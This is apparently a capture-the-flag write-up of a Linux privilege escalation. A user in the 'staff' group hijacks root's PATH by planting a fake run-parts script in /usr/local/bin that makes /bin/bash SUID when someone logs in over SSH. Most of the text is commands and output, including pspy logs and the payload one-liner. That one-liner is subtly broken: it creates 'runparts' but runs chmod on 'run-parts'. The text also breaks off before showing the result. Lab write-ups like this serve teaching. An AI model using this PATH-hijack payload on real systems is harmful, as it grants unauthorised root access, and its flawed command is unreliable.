## scenario
We start our enumeration by looking at our user's groups.
```
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr)
groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```
These mostly consist of default Debian groups, however, staff sticks out as it is non-standard.
## staff
According to Debian documentation:
```
staff: Allows users to add local modifications to the system (/usr/local) without needing root
privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and
they may “override” the executables in /bin and /usr/bin with the same name). Compare
with group “adm”, which is more related to monitoring/security.
```
As staff , we can write to /usr/local/bin and /usr/local/sbin:
```
jkr@writeup:~$ ls -ld /usr/local/bin/ /usr/local/sbin/
drwx-wsr-x 2 root staff 20480 Apr 19 04:11 /usr/local/bin/
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/
```
Both of these paths are typically in the root user's $PATH environment variable, which means that we could replace a program that root is likely to run out of those directories with a malicious
file containing a payload that will allow us to escalate our privileges. To see what the root user might be doing on the system, we upload pspy to the machine.
https://github.com/DominicBreuker/pspy
```
2019/06/09 08:45:43 CMD: UID=0 PID=8528 | sshd: [accepted]
2019/06/09 08:45:43 CMD: UID=0 PID=8529 | sshd: [accepted]
2019/06/09 08:45:43 CMD: UID=0 PID=8530 | sshd: jkr [priv]
2019/06/09 08:45:43 CMD: UID=0 PID=8531 | sh -c /usr/bin/env -i
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --
lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2019/06/09 08:45:43 CMD: UID=0 PID=8532 | run-parts --lsbsysinit /etc/updatemotd.d
2019/06/09 08:45:43 CMD: UID=0 PID=8533 | /bin/sh /etc/update-motd.d/10-uname
```
As we SSH into the machine, root uses sh to run /usr/bin/env , and we see that motd was
called and the file 10-uname was accessed. We also see that the PATH specified before running
run-parts includes two directories that we can write to, at the very start. 

## Exploitation
With that in mind, we will now create a malicious run-parts file in /usr/local/bin , which we
know will be executed as soon as we SSH into the machine.
Using the following one-liner, we create an executable payload that will turn the bash binary into
an SUID binary, effectively giving us a root shell. 
```
jkr@writeup:~$ echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/runparts; chmod +x /usr/local/bin/run-parts
```
Now, as soon as we SSH into the machine as jkr , we see that our payload was triggered, as the
SUID bit is set on /bin/bash :
